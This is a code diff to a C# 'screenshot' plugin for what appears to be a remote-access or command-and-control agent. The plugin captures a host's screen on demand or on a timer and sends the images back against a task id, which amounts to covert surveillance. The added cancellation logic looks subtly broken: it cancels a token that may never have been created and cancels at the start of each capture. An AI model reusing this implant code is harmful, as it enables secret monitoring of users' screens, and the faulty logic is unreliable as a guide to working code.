@@ -17,6 +17,8 @@ namespace Agent
         public string Name => "screenshot";
         private IMessageManager messageManager { get; set; }
         private System.Timers.Timer screenshotTimer;
+        private CancellationTokenSource cancellationTokenSource;
+        private bool isRunning = false;
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
@@ -28,10 +30,12 @@ namespace Agent
 
             if (args.interval <= 0)
             {
+                cancellationTokenSource.Cancel();
                 await CaptureAndSendScreenshot(job.task.id);
             }
             else
             {
+                cancellationTokenSource = new CancellationTokenSource();
                 screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
                 screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(job.task.id);
 
@@ -49,8 +53,10 @@ namespace Agent
 
         private async Task CaptureAndSendScreenshot(string task_id)
         {
+            cancellationTokenSource.Cancel();
             try
             {
+
                 var bitmaps = ScreenCapture.Capture();
 
                 // Determine the size of the combined bitmap
